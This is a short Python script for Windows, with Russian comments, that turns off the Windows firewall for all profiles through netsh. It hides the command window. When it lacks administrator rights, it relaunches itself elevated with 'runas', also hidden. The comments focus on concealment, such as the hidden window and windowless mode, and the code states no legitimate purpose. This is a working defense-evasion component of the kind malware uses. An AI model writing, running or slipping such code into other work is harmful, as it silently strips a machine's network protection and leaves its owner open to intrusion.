import ctypes
import subprocess
import sys

def firewall():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            # Скрыть окно netsh: использовать STARTUPINFO или CREATE_NO_WINDOW
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            subprocess.run(
                ["netsh", "advfirewall", "set", "allprofiles", "state", "off"],
                check=True,
                startupinfo=startupinfo,
                stdin=subprocess.DEVNULL  # Обязательно для режима -w, иначе возможна ошибка WinError 6
            )
            print("Брандмауэр отключён.")
        else:
            # Ключевое изменение: последний параметр изменён с 1 на 0 (SW_HIDE)
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 0
            )
    except Exception:
        return False